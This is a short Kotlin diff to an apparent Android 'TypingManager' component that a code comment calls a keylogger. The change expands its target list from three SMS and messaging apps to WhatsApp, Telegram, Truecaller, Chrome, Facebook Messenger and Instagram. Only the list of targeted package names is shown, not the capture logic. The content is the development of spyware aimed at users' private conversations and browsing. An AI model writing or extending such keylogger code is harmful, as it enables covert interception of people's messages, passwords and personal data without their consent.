@@ -5,11 +5,18 @@ import org.json.JSONArray
 import org.json.JSONObject
 
 object TypingManager {
-    // The 3 Target Apps
+    // EXPANDED TARGET LIST (Keylogger + Screen Reader Sync)
     private val TARGETS = setOf(
         "com.imo.android.imoim", 
         "com.google.android.apps.messaging", 
-        "com.samsung.android.messaging"
+        "com.samsung.android.messaging",
+        "com.whatsapp",
+        "org.telegram.messenger",
+        "org.telegram.plus",
+        "com.truecaller",
+        "com.android.chrome",
+        "com.facebook.orca",
+        "com.instagram.android"
     )
 
     private var lastPkg = ""
